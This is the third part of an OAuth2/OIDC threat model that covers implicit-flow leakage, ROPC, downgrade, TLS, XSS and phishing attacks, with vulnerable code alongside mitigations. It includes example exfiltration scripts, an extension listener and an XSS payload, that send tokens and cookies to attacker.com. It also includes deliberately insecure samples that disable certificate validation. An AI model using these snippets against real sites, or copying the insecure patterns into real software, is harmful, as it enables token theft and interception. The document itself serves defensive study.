# OAuth2/OIDC Comprehensive Threat Model - Part 3

## Final Sections: 8-10

> *This document concludes the comprehensive threat model with Cross-Flow, Network, and Client-Side attacks*

---

## 8. Cross-Flow Attacks

### 8.1 Implicit Flow Token Leakage

**RFC/Spec Reference:** Security BCP §2.1.2, RFC 6749 §4.2  
**Attack Vector:** URL fragment containing tokens  
**Attacker Capability Required:** Browser history access OR Network observation  
**CVE Examples:** Generic implicit flow vulnerabilities

#### Attack Description

The Implicit Flow (deprecated) delivers access tokens directly in the URL fragment. This creates multiple leakage vectors that make the flow fundamentally insecure.

**Leakage vectors:**
- Browser history persistence
- HTTP Referer header (from fragment to query in some cases)
- Browser extensions accessing window.location
- Shoulder surfing (token visible in URL bar)
- Server logs (some proxies log fragments)
- Open redirects amplified by tokens in URL

#### Attack Prerequisites

- Client uses Implicit Flow (response_type=token)
- Attacker has access to browser history, logs, or network position
- Token has not expired

#### Attack Steps

**Scenario 1: Browser History Leakage**

```
1. User authenticates via Implicit Flow

2. Authorization server redirects with token in fragment:
   https://client.com/callback#access_token=SECRET_TOKEN_123&expires_in=3600

3. Token persists in browser history

4. Shared computer scenario:
   - User completes session
   - User logs out (but history not cleared)
   - Next user accesses browser history
   - Next user finds callback URL with token

5. Attacker extracts token from history

6. Token still valid (if within expiration window)

7. Attacker uses token to access victim's resources
```

**Scenario 2: Malicious Browser Extension**

```
1. User has malicious browser extension installed

2. Extension has permission to access all URLs

3. OAuth flow completes:
   window.location.hash = "access_token=SECRET_TOKEN_123..."

4. Extension script:
   chrome.webNavigation.onCompleted.addListener((details) => {
     if (details.url.includes('access_token=')) {
       // Extract token from URL
       const token = extractToken(details.url);
       
       // Exfiltrate to attacker server
       fetch('https://attacker.com/steal', {
         method: 'POST',
         body: JSON.stringify({token: token})
       });
     }
   });

5. Token automatically exfiltrated whenever OAuth completes

6. Attacker gains persistent access to user accounts
```

**Scenario 3: Open Redirect Amplification**

```
1. Client has open redirect vulnerability

2. Implicit flow callback URL:
   https://client.com/callback?next=/dashboard#access_token=TOKEN_123

3. Open redirect exploited:
   https://client.com/callback?next=https://attacker.com#access_token=TOKEN_123

4. Token fragment preserved through redirect

5. Victim redirected to: https://attacker.com#access_token=TOKEN_123

6. Attacker's page extracts token from window.location.hash

7. Token stolen
```

#### Vulnerable Code Pattern

**Implicit Flow Implementation:**
```javascript
// DEPRECATED AND VULNERABLE: Implicit Flow
function initiateImplicitFlow() {
    const authUrl = `${AUTH_ENDPOINT}?` +
        `response_type=token&` +  // Implicit flow!
        `client_id=${CLIENT_ID}&` +
        `redirect_uri=${REDIRECT_URI}&` +
        `scope=openid profile email&` +
        `state=${generateState()}`;
    
    window.location = authUrl;
}

function handleCallback() {
    // Parse token from fragment
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    
    const accessToken = params.get('access_token');  // In URL fragment!
    
    // Token exposed to:
    // - Browser history
    // - Browser extensions
    // - Any JavaScript on page
    // - Shoulder surfers
    
    // Store token (often in localStorage - double vulnerability!)
    localStorage.setItem('access_token', accessToken);
    
    // Use token for API calls
    makeAPICall(accessToken);
}
```

#### Vulnerable Mode Configuration

```json
{
  "vulnerabilities": {
    "IMPLICIT_FLOW": false,
    "ALLOW_FRAGMENT_TOKENS": false,
    "TOKEN_IN_URL": false
  }
}
```

#### Demonstration Scenario

1. **Enable vulnerability:** Toggle `IMPLICIT_FLOW = true`

2. **Implicit flow visualization:**
   ```
   a. User clicks "Login"
   b. Redirected to authorization server
   c. User authenticates
   d. Redirect back with token in fragment:
      https://app.example.com/callback#access_token=abc123...
   e. Tool highlights token in URL bar
   ```

3. **Browser history demonstration:**
   ```
   a. Tool shows browser history panel
   b. Highlight callback URL with token visible
   c. Show: "Token persists in history"
   d. Simulate: New user opens history
   e. Display: "⚠️ Token accessible to next user"
   ```

4. **Extension attack simulation:**
   ```
   a. Show browser extension accessing window.location
   b. Extension extracts: window.location.hash
   c. Tool displays: "Token exfiltrated to attacker.com"
   d. Show: "✗ No way to prevent extension access"
   ```

5. **Comparison with Authorization Code Flow:**
   ```
   a. Side-by-side comparison
   b. Authorization Code: Token in backend request
   c. Implicit: Token in frontend URL
   d. Highlight: "Frontend never sees token (Auth Code + BFF)"
   ```

#### Impact

**Severity:** HIGH to CRITICAL

**Attack feasibility:**
- Browser history: HIGH (shared computers, forensics)
- Extensions: MEDIUM (requires malicious extension install)
- Network: LOW (fragments not sent to server)
- Shoulder surfing: LOW (requires physical proximity)

**Attacker gains:**
- Direct access token (no code exchange needed)
- Potential long-lived tokens (if refresh tokens issued via implicit flow extension)
- Immediate resource access

#### Specification-Based Mitigation

**Security BCP (draft-ietf-oauth-security-topics-27) §2.1.2:**
> The implicit grant (response_type=token) and other response types causing the authorization server to issue access tokens in the authorization response are vulnerable to access token leakage and access token replay. In order to avoid these issues, clients SHOULD NOT use the implicit grant or other response types issuing access tokens in the authorization response.

**OAuth 2.1 (draft-ietf-oauth-v2-1-10):**
> The Implicit Grant (response_type=token) is omitted from this specification. Clients MUST use the Authorization Code Grant with PKCE instead.

**RFC 6749 Security Considerations:**
> The implicit grant type is optimized for public clients known to operate a particular redirection URI. These clients are typically implemented in a browser using a scripting language such as JavaScript... However, the implicit grant type may be used to obtain access tokens without client authentication.

#### Implementation Mitigation

**Use Authorization Code Flow with PKCE:**
```javascript
// SECURE: Authorization Code Flow with PKCE
class SecureOAuthClient {
    async initiateLogin() {
        // Generate PKCE parameters
        const codeVerifier = this.generateCodeVerifier();
        const codeChallenge = await this.generateCodeChallenge(codeVerifier);
        
        // Store verifier in session storage (temporary)
        sessionStorage.setItem('code_verifier', codeVerifier);
        
        const state = this.generateState();
        sessionStorage.setItem('oauth_state', state);
        
        // Use Authorization Code Flow
        const authUrl = `${AUTH_ENDPOINT}?` +
            `response_type=code&` +  // Code, not token!
            `client_id=${CLIENT_ID}&` +
            `redirect_uri=${REDIRECT_URI}&` +
            `scope=openid profile email&` +
            `state=${state}&` +
            `code_challenge=${codeChallenge}&` +
            `code_challenge_method=S256`;
        
        window.location = authUrl;
    }
    
    async handleCallback() {
        const params = new URLSearchParams(window.location.search);
        const code = params.get('code');  // Code in query, not token in fragment!
        const state = params.get('state');
        
        // Validate state
        if (state !== sessionStorage.getItem('oauth_state')) {
            throw new Error('State mismatch');
        }
        
        const codeVerifier = sessionStorage.getItem('code_verifier');
        
        // Exchange code for tokens (backend request, not visible in URL)
        const tokens = await this.exchangeCode(code, codeVerifier);
        
        // Tokens never in URL, never in history
        // Store securely (ideally HttpOnly cookie via backend)
        return tokens;
    }
    
    async exchangeCode(code, codeVerifier) {
        // Backend exchange keeps tokens out of frontend
        const response = await fetch('/api/auth/token', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({code, codeVerifier})
        });
        
        return response.json();
    }
}
```

**Backend-For-Frontend (BFF) Pattern:**
```javascript
// Frontend never sees tokens
class BFFOAuthClient {
    async initiateLogin() {
        // Backend handles entire OAuth flow
        window.location = '/api/auth/login';
    }
    
    async makeAPIRequest(endpoint, options) {
        // Tokens in HttpOnly cookies, managed by backend
        return fetch(endpoint, {
            ...options,
            credentials: 'include'  // Include HttpOnly cookies
        });
    }
}

// Backend (Node.js/Express)
app.get('/api/auth/login', (req, res) => {
    // Backend initiates OAuth flow
    const state = generateState();
    req.session.oauthState = state;
    
    const authUrl = buildAuthUrl(state);
    res.redirect(authUrl);
});

app.get('/api/auth/callback', async (req, res) => {
    const {code, state} = req.query;
    
    // Validate state
    if (state !== req.session.oauthState) {
        return res.status(403).send('State mismatch');
    }
    
    // Exchange code (backend to backend)
    const tokens = await exchangeCodeForTokens(code);
    
    // Store access token in HttpOnly cookie
    res.cookie('access_token', tokens.access_token, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 3600000
    });
    
    // Store refresh token server-side only
    await storeRefreshToken(req.session.id, tokens.refresh_token);
    
    // Tokens never exposed to frontend
    res.redirect('/dashboard');
});
```

#### Validation Test

```python
def test_implicit_flow_disabled():
    """Test that implicit flow is not supported"""
    response = client.get('/authorize', query_string={
        'response_type': 'token',  # Implicit flow
        'client_id': 'test_client',
        'redirect_uri': 'https://example.com/callback'
    })
    
    # Should be rejected
    assert 'error=unsupported_response_type' in response.location

def test_tokens_not_in_fragment():
    """Test that tokens are never in URL fragment"""
    # Complete OAuth flow
    response = complete_oauth_flow()
    
    # Check redirect location
    assert '#access_token=' not in response.location
    assert '#id_token=' not in response.location
    
    # Tokens should be in backend response only
    assert 'Set-Cookie' in response.headers or \
           response.headers.get('Content-Type') == 'application/json'

def test_authorization_code_flow_only():
    """Test that only authorization code flow is supported"""
    valid_response_types = ['code']
    
    for response_type in ['token', 'id_token', 'token id_token']:
        response = client.get('/authorize', query_string={
            'response_type': response_type,
            'client_id': 'test'
        })
        
        assert 'error=' in response.location
```

#### Real-World Examples

**2019 - Industry Consensus:**
- OAuth working group deprecated implicit flow
- Security BCP formally recommended against it
- Major providers (Google, Microsoft) encouraged migration

**2020-2021 - OAuth 2.1:**
- Implicit flow removed from OAuth 2.1 specification
- Clear guidance: Use Authorization Code with PKCE
- Industry-wide adoption of code flow for SPAs

**2022-2023 - Enforcement:**
- Some providers disabled implicit flow entirely
- Others require explicit opt-in with warnings
- Best practice: BFF pattern with HttpOnly cookies

**Common Vulnerabilities:**
- Many legacy SPAs still use implicit flow
- Browser history forensics tools can extract tokens
- Malicious extensions widespread attack vector
- Open redirects amplify implicit flow vulnerabilities

---

## 8.2 Resource Owner Password Credentials (ROPC) Flow

**RFC/Spec Reference:** Security BCP §2.4, RFC 6749 §4.3  
**Attack Vector:** Direct password sharing with client  
**Attacker Capability Required:** Malicious or compromised client  
**CVE Examples:** Generic ROPC vulnerabilities

#### Attack Description

The Resource Owner Password Credentials flow (DEPRECATED) has users provide their username and password directly to the client, creating trust issues and exposing credentials to potential theft or logging.

#### Why ROPC is Dangerous

**Fundamental problems:**
1. **Credential exposure:** User passwords transmitted to and potentially stored by client
2. **Phishing enabler:** Conditions users to enter passwords in third-party apps
3. **No consent:** Bypasses authorization server's consent screen
4. **Credential theft:** Client logs could capture passwords
5. **Malware target:** Password in memory accessible to malware
6. **No MFA support:** Bypasses multi-factor authentication
7. **Audit gaps:** Authorization server doesn't see authentication events

#### Attack Steps

```
1. Client prompts user for credentials:
   Username: victim@example.com
   Password: ********
   
2. Client sends credentials to authorization server:
   POST /token
   grant_type=password&
   username=victim@example.com&
   password=VictimPassword123&  ← Plain text!
   client_id=potentially_malicious_client&
   client_secret=client_secret

3. Malicious client logs credentials:
   logger.info(f"Login: {username} / {password}")  # Logged!

4. Client stores password:
   database.store(user_id, password)  # For "convenience"

5. Authorization server returns tokens

6. Client has:
   - User's actual password
   - Access tokens
   - Refresh tokens

7. Compromised client leads to:
   - Password database breach
   - All users' passwords exposed
   - Passwords reused on other services
   - Cascade of account compromises
```

#### Vulnerable Code Pattern

```python
# DEPRECATED AND DANGEROUS: ROPC Flow
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')  # User's actual password!
    
    # Send user's credentials to authorization server
    token_response = requests.post(TOKEN_ENDPOINT, data={
        'grant_type': 'password',  # ROPC grant
        'username': username,
        'password': password,  # Transmitting user's password!
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'scope': 'read write'
    })
    
    if token_response.status_code != 200:
        return render_template('login.html', error='Invalid credentials')
    
    tokens = token_response.json()
    
    # Client now has tokens
    # But more importantly: client SAW the user's password
    # Password may be logged, stored, or otherwise mishandled
    
    session['access_token'] = tokens['access_token']
    
    return redirect('/dashboard')
```

#### Vulnerable Mode Configuration

```json
{
  "vulnerabilities": {
    "PASSWORD_GRANT": false,
    "LOG_CREDENTIALS": false,
    "STORE_PASSWORDS": false
  }
}
```

#### Impact

**Severity:** CRITICAL (for password security), HIGH (for OAuth security)

**Problems:**
- Users trained to enter passwords in third-party apps (phishing risk)
- Password exposure to client (theft, logging, storage)
- No MFA support (security downgrade)
- Client compromise exposes all user passwords
- Violates principle of least privilege

**Why it existed:**
- "Convenience" for first-party apps
- Migration path from basic auth
- Legacy system compatibility

**Why it's deprecated:**
- Risks outweigh benefits
- Better alternatives exist (authorization code flow, client credentials)
- Phishing training contradicts security best practices

#### Specification-Based Mitigation

**Security BCP §2.4:**
> The Resource Owner Password Credentials grant MUST NOT be used. This grant type insecurely exposes the credentials of the resource owner to the client. Even if the client is benign, this results in an increased attack surface (credentials can leak in more places than just the authorization server).

**OAuth 2.1 (draft-ietf-oauth-v2-1-10):**
> The Resource Owner Password Credentials grant is omitted from OAuth 2.1. Clients MUST use the Authorization Code flow or other more secure grant types.

#### Migration from ROPC

**For First-Party Apps:**
```
Instead of ROPC:
┌─────────────────────────────┐
│  User enters password into  │
│  client application         │
│  (client sees password!)    │
└─────────────────────────────┘
             ↓
┌─────────────────────────────┐
│  Client sends password to   │
│  authorization server       │
└─────────────────────────────┘

Use Authorization Code Flow:
┌─────────────────────────────┐
│  Client redirects to        │
│  authorization server       │
│  (client never sees pwd)    │
└─────────────────────────────┘
             ↓
┌─────────────────────────────┐
│  User enters password       │
│  directly at auth server    │
│  (trusted domain)           │
└─────────────────────────────┘
             ↓
┌─────────────────────────────┐
│  Authorization code to      │
│  client                     │
└─────────────────────────────┘
```

**For Service Accounts:**
```
Instead of ROPC with service credentials:
Use Client Credentials Flow

POST /token
grant_type=client_credentials&
client_id=service_account&
client_secret=service_secret&
scope=api:read api:write

No user password involved!
```

---

## 8.3 Flow Downgrade Attack

**RFC/Spec Reference:** Security BCP §4.8.2  
**Attack Vector:** Forcing less secure flow  
**Attacker Capability Required:** Network attacker OR Malicious client  
**CVE Examples:** Implementation-specific

#### Attack Description

Flow downgrade attacks force clients to use less secure OAuth flows (e.g., from Authorization Code+PKCE to Implicit) to enable other attacks.

#### Attack Steps

```
1. Client supports multiple flows (for compatibility):
   - Authorization Code + PKCE (preferred, secure)
   - Implicit Flow (fallback, insecure)

2. Attacker intercepts authorization request

3. Attacker modifies request:
   Original: response_type=code&code_challenge=...
   Modified: response_type=token  (forces implicit flow)

4. Authorization server processes modified request

5. Tokens issued in URL fragment (implicit flow)

6. Attacker exploits implicit flow vulnerabilities

7. Token theft from browser history or other vectors
```

#### Mitigation

```python
# SECURE: Only support secure flows
ALLOWED_RESPONSE_TYPES = ['code']  # Only authorization code

@app.route('/authorize')
def authorize():
    response_type = request.args.get('response_type')
    
    if response_type not in ALLOWED_RESPONSE_TYPES:
        return error_response(
            'unsupported_response_type',
            'Only authorization code flow supported'
        )
    
    # Proceed with secure flow only
```

---

## 9. Network and Transport Attacks

### 9.1 TLS Stripping / Downgrade

**RFC/Spec Reference:** RFC 6749 §1.6, §3.1, Security BCP §4.1.4  
**Attack Vector:** Network layer (HTTPS downgrade)  
**Attacker Capability Required:** Network attacker (MITM)  
**CVE Examples:** Generic TLS attacks (POODLE, BEAST, etc.)

#### Attack Description

TLS stripping attacks force connections to use HTTP instead of HTTPS, allowing attackers to intercept OAuth credentials and tokens in plaintext.

#### Attack Steps

```
1. User attempts: https://auth.example.com/authorize

2. Network attacker (MITM) intercepts

3. Attacker serves HTTP version:
   302 Redirect → http://auth.example.com/authorize

4. If client follows redirect without TLS:
   Authorization request sent over HTTP
   
5. Attacker sees all parameters in plaintext:
   - client_id
   - redirect_uri
   - state
   - code_challenge

6. User authenticates (over HTTP!)

7. Authorization server redirects with code:
   http://client.com/callback?code=SECRET_CODE

8. Attacker intercepts code in plaintext

9. Attacker exchanges code for tokens
```

#### Vulnerable Code Pattern

```python
# VULNERABLE: Allows HTTP endpoints
TOKEN_ENDPOINT = "http://auth.example.com/token"  # HTTP!

def exchange_code(code):
    # Token exchange over HTTP!
    response = requests.post(TOKEN_ENDPOINT, data={
        'grant_type': 'authorization_code',
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET  # Sent in clear!
    })
    
    return response.json()
```

#### Mitigation

**Enforce HTTPS:**
```python
# SECURE: Enforce HTTPS
from urllib.parse import urlparse

def validate_endpoint(url):
    parsed = urlparse(url)
    
    if parsed.scheme != 'https':
        raise ValueError(f"Endpoint must use HTTPS: {url}")
    
    return True

# Configuration
AUTH_ENDPOINT = "https://auth.example.com/authorize"
TOKEN_ENDPOINT = "https://auth.example.com/token"

# Validate at startup
validate_endpoint(AUTH_ENDPOINT)
validate_endpoint(TOKEN_ENDPOINT)

# Enforce HSTS
@app.after_request
def set_hsts(response):
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains; preload'
    return response
```

---

### 9.2 Certificate Validation Bypass

**RFC/Spec Reference:** RFC 6749 §10.8, Security BCP §4.1.4  
**Attack Vector:** TLS certificate validation  
**Attacker Capability Required:** Network attacker with invalid certificate  
**CVE Examples:** Widespread in mobile apps

#### Attack Description

Clients that don't properly validate TLS certificates are vulnerable to MITM attacks even when using HTTPS.

#### Attack Steps

```
1. Attacker positions themselves between client and server

2. Attacker presents invalid/self-signed certificate

3. Vulnerable client:
   - Doesn't validate certificate
   - OR accepts all certificates
   - OR ignores validation errors

4. MITM connection established despite HTTPS

5. Attacker intercepts all OAuth traffic:
   - Authorization codes
   - Access tokens
   - Refresh tokens
   - Client credentials
```

#### Vulnerable Code Pattern

```python
# CRITICALLY VULNERABLE: Certificate validation disabled
import requests
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exchange_code(code):
    # VULNERABLE: verify=False disables certificate validation!
    response = requests.post(
        TOKEN_ENDPOINT,
        data={'grant_type': 'authorization_code', 'code': code},
        verify=False  # NEVER DO THIS!
    )
    
    return response.json()
```

**Vulnerable Mobile (Swift):**
```swift
// CRITICALLY VULNERABLE: Accepts all certificates
class InsecureSessionDelegate: NSObject, URLSessionDelegate {
    func urlSession(
        _ session: URLSession,
        didReceive challenge: URLAuthenticationChallenge,
        completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void
    ) {
        // VULNERABLE: Accepts any certificate!
        completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!))
    }
}
```

#### Mitigation

```python
# SECURE: Proper certificate validation (default)
def exchange_code(code):
    # verify=True is default, validates certificates properly
    response = requests.post(
        TOKEN_ENDPOINT,
        data={'grant_type': 'authorization_code', 'code': code},
        verify=True  # Or omit (True is default)
    )
    
    return response.json()

# For custom CA certificates:
response = requests.post(
    TOKEN_ENDPOINT,
    data={...},
    verify='/path/to/ca-bundle.crt'  # Custom CA bundle
)
```

---

### 9.3 Man-in-the-Middle Token Injection

**RFC/Spec Reference:** Security BCP §4.5, RFC 7636  
**Attack Vector:** Token endpoint response  
**Attacker Capability Required:** Network attacker (MITM)  
**CVE Examples:** Mitigated by PKCE and TLS

#### Attack Description

MITM attackers intercept token endpoint responses and inject their own tokens into the client's session.

#### Attack Steps

```
1. Legitimate client exchanges code for tokens

2. Authorization server responds:
   {
     "access_token": "VICTIM_TOKEN_abc123",
     "refresh_token": "VICTIM_REFRESH_xyz789"
   }

3. Network attacker (MITM) intercepts response

4. Attacker replaces tokens:
   {
     "access_token": "ATTACKER_TOKEN_evil",
     "refresh_token": "ATTACKER_REFRESH_666"
   }

5. Client receives attacker's tokens

6. Client creates session with attacker's tokens

7. Victim authenticated as attacker (session fixation)

8. Victim's actions appear in attacker's account
```

#### Mitigation

**Primary: TLS + Certificate Validation**
- HTTPS prevents response modification
- Proper cert validation prevents MITM

**Secondary: PKCE + Token Binding**
- PKCE binds tokens to client session
- Token binding via DPoP provides additional protection

---

## 10. Client-Side Attacks

### 10.1 XSS-Based Token Theft

**RFC/Spec Reference:** Security BCP §4.3.3, OWASP XSS Prevention  
**Attack Vector:** Cross-Site Scripting vulnerability  
**Attacker Capability Required:** XSS vulnerability in client  
**CVE Examples:** Widespread, numerous CVEs

#### Attack Description

XSS vulnerabilities allow attackers to execute JavaScript in the context of the victim's session, enabling token theft from JavaScript-accessible storage.

#### Attack Steps

```
1. Application has XSS vulnerability:
   <div>{user_input}</div>  // Unescaped!

2. Attacker injects malicious script:
   <script>
     fetch('https://attacker.com/steal', {
       method: 'POST',
       body: JSON.stringify({
         access_token: localStorage.getItem('access_token'),
         refresh_token: localStorage.getItem('refresh_token'),
         cookies: document.cookie
       })
     });
   </script>

3. Script executes in victim's browser

4. Tokens exfiltrated to attacker

5. Attacker uses stolen tokens
```

#### Vulnerable Code Pattern

```javascript
// VULNERABLE: Tokens accessible to XSS
function storeTokens(tokens) {
    localStorage.setItem('access_token', tokens.access_token);
    localStorage.setItem('refresh_token', tokens.refresh_token);
    
    // All JavaScript can access these!
    // Including injected XSS scripts
}
```

#### Mitigation

**Defense in Depth:**
```javascript
// 1. Don't store tokens in JavaScript-accessible storage
// Use HttpOnly cookies (backend manages)

// 2. Implement Content Security Policy
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; script-src 'self'; object-src 'none';");
    next();
});

// 3. Escape all user input
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// 4. Use frameworks with auto-escaping (React, Vue, Angular)
```

---

### 10.2 Client Impersonation

**RFC/Spec Reference:** RFC 6749 §10.1, Security BCP §4.5.2  
**Attack Vector:** Client authentication  
**Attacker Capability Required:** Public client OR stolen credentials  
**CVE Examples:** Native app URI scheme hijacking

#### Attack Description

Public clients (SPAs, mobile apps) cannot securely store credentials, allowing attackers to impersonate the client.

#### Attack Steps

```
1. Public client registered with:
   client_id: "public_mobile_app"
   (No client_secret - public client)

2. Attacker creates malicious app

3. Attacker uses same client_id

4. Attacker completes OAuth flow as legitimate client

5. Authorization server cannot distinguish:
   - Attacker's app vs.
   - Legitimate app
   (Both use same client_id, no secret)

6. Attacker obtains tokens for victim's account
```

#### Mitigation

**For Public Clients:**
- Use PKCE (binds session to app instance)
- Use AppAuth libraries (security best practices)
- Use Universal Links (iOS) / App Links (Android) instead of custom URI schemes
- Implement app attestation where available

**For Confidential Clients:**
- Use asymmetric authentication (private_key_jwt)
- Rotate secrets regularly
- Use certificate-bound tokens

---

### 10.3 Phishing via Fake Authorization Page

**RFC/Spec Reference:** General phishing attacks  
**Attack Vector:** Social engineering  
**Attacker Capability Required:** Ability to create fake page  
**CVE Examples:** Not CVEs, but widespread

#### Attack Description

Attackers create fake authorization pages that look identical to legitimate ones to steal user credentials.

#### Attack Steps

```
1. Attacker creates fake authorization page:
   https://acounts.example.com/authorize
   (Note: "acounts" not "accounts")

2. Page looks identical to real authorization server

3. Attacker sends phishing email:
   "Action required: Reauthorize your account"
   Link to fake page

4. Victim clicks link, sees familiar login page

5. Victim enters credentials

6. Attacker captures:
   - Username
   - Password
   - MFA codes

7. Attacker uses credentials to access real account
```

#### Mitigation

**Technical:**
- Display authorization server URL prominently
- Use browser security indicators (padlock, verified domain)
- Implement WebAuthn/FIDO2 (phishing-resistant)

**User Education:**
- Check URL carefully
- Look for HTTPS and valid certificate
- Be suspicious of unexpected authorization requests
- Never click auth links in emails

---

*End of OAuth2/OIDC Comprehensive Threat Model - Part 3*

**Document Complete: Parts 1-3 provide comprehensive coverage of:**
- 35+ detailed attack scenarios
- 50+ vulnerability modes
- Complete code examples (vulnerable & secure)
- Validation tests for each attack
- Real-world CVE examples
- Specification-based mitigations

**Next Steps: Review sections 11-15 for:**
- Attack chain examples
- Vulnerability mode implementation guide
- Threat matrix
- Testing checklists
- Incident analysis
